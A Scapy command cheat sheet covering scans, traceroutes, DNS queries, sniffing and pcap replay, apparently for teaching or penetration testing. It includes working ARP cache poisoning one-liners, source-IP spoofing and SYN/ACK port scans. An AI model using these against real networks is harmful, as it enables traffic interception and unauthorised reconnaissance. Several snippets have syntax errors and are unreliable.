# Scapy

## Objectives

We'll go over some examples on how to use and leverage scapy.

## Scapy 3 Main Functions

```text
sr() - The sr() function is for sending packets and receiving answers. The function returns a couple of packet and answers, and the unanswered packets.)
sr1() - This function is a variant that only returns one packet that answered the sent packet (or the packet set) sent.
srp() - The function srp() does the same for layer 2 packets (Ethernet, 802.3, etc).)
```

## List protocol details:

```text
ls(ARP)
ls(IP)
ls(UDP|TCP|DNS|IPv6)
```

## Various Commands:

Arp-ping

```text
arping("192.168.1.*")
```

Ping Scan Network

```text
ans,unans=sr(IP(dst="10.168.1.1-254")/ICMP())
```

Scapy IPv6 Example:

```text
i=IPv6(src=2001:db8::1, dst="example.com", hoplimit=64)     
tcp=(dport=[21,22,80,8080],flags=‘S’)     
packet=i/tcp     
packet2=i/tcp(flags=‘SF’)
```

IPv6 TCP Traceroute with Scapy

```text
traceroute6("www.yahoo.com", maxttl=15)
```

IPv4 TCP Traceroute with Scapy

```text
traceroute (["www.google.com"], maxttl=20)
```

Send packet to destination

```text
send(IP(dst="10.168.1.1")/ICMP()/"HelloWorld")
```

Spoof Packet

```text
send(IP(src="192.168.1.210", dst="10.168.1.1")/ICMP()/"HelloWorld")
```

Change TTL of Packet

```text
send(IP(src="10.1.99.100", dst="10.168.1.1", ttl=128)/ICMP()/"HelloWorld")
```

Send a Ping Reply \(ICMP Type 0\) to 10.1.99.2

```text
send(IP(src="10.1.99.100", dst="10.1.99.2", ttl=128)/ICMP(type=0)/"HelloWorld")
```

Send and receive 1 packet and see response:

```text
packet=sr1(IP(dst="10.168.1.1", ttl=128)/ICMP()/"HelloWorld")
packet or packet.show()
```

Send and receive TCP packet and see response:

```text
p=sr(IP(dst="10.168.1.1")/TCP(dport=22))
ans,unans=_
ans.summary()
```

TCP ping against a subnet using port 80 \(HTTP\) and sending just a SYN flag:

```text
ans,unans=sr( IP(dst=”192.168.1.*”)/TCP(dport=80, flags=”S”))
```

ACK Scan:

```text
ans,unans=sr(IP(dst="192.168.1.1")/TCP(dport=[80,666],flags="A"))
ans.show()
```

Specify Multiple destination ports:

```text
rekal=sr(IP(dst="10.168.1.1")/TCP(dport=[23,80,53,443]))
rekal
ans,unans=_
ans.summary()
```

SYN scan is a one line of code:

```text
p=sr(IP(dst="192.168.1.1")/TCP(sport=666,dport=[22,80,21,443], flags="S"))
ans,unans=_
ans.summary()
```

SYN+ACK scan one line of code:

```text
ackscan=sr(IP(dst="10.168.1.1")/TCP(sport=666,dport=[22,80,21,443], flags="A"))
ackscan
ans,unans=_
ans.summary()
```

## Scapy DNS

DNS Query:

```text
sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.scanme.com")))
```

DNS Traceroute:

```text
ans,unans=traceroute("4.2.2.1",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="thesprawl.org")))
```

DNS Ask for NS Record:

```text
sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1,qd=DNSQR(qname="scanme.com",qtype= "NS")))
```

Look for NS or SOA Record with Scapy:

```text
sr1(IP(dst="8.8.4.4")/UDP()/DNS(rd=1,qd=DNSQR(qname="msn.com",qtype= "NS")))
sr1(IP(dst="8.8.4.4")/UDP()/DNS(rd=1,qd=DNSQR(qname="msn.com",qtype= "SOA")))
```

## Scapy ARP Cache Poisoning

ARP cache poisoning:

```text
send( Ether(dst=clientMAC)/ARP(op=”who-has”, psrc=gateway, pdst=client). inter=RandNum(10,40), loop=1)
```

ARP cache poisoning with double 802.1q encapsulation:

```text
send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) /ARP(op="who-has", psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1 )
```

Scapy function called arpcachepoison\(\):

```text
arpcachepoison(target, victim, interval=60)
```

Gratuitous ARP:

```text
ether=Ether(dst='ff:ff:ff:ff:ff:ff', type=0x0806)
arp=ARP(ptype=0x0800, hwsrc='00:0c:29:40:87:37', psrc='192.168.216.50', hwdst='00:0c:29:40:87:37', pdst='192.168.216.50')
grat_arp=ether/arp
sendp(grat_arp)
```

## Scapy Sniffing, Writing, Replaying Packets

Sniffing Packets with Scapy: To sniff and review all packets on listening interfaces:

```text
sniff()
a=_
a.nsummary()
```

To view details of the 5th packet:

```text
a[5]
```

Filter 10 ICMP packets on the eth interface and view packet 9:

```text
sniff(iface="eth0", filter="icmp", count=10)
b=_
b.nsummary()
b[9]
```

Writing pcap files:

```text
pkts1=sniff(iface="eth0",filter="tcp and port 80",count=10)
wrpcap("/tmp/write1.pcap",pkts1)
```

Replaying a pcap file:

```text
pkts=rdpcap(“/tmp/attack.pcap”)
for pkt in pkts:
send(pkt)
```

Reading PCAP Files - Import a PCAP:

```text
read1 = rdpcap("/tmp/read1.pcap")
read1
read1.summary()
```

Sends stimulus, receives responses, and displays responses, in a loop.

```text
packet = IP(dst='192.168.1.1')/ICMP()
srloop(packet)
```

Simple tcp-replay tool:

```text
sendp(rdpcap("/tmp/pcapfile")) # tcpreplay
```

Generate packets:

```text
packets=Ether()/IP(dst="www.sans.org")/ICMP()
```

Then let’s show them with Wireshark:

```text
wireshark(packets)
```

Now let's replay the packets:

```text
pkts=rdpcap(“/tmp/attack.pcap”)
for pkt in pkts:
send(pkt)
```

Send and Response and check answered and unanswered responses:

```text
sr(IP(dst="192.168.8.1")/TCP(dport=[21,22,23]))
ans,unans=_
ans.summary()
```

TCP Traceroute and then on a specific port:

```text
traceroute (["www.google.com"], maxttl=20)
traceroute (["www.google.com"],dport=443,maxttl=20)
```

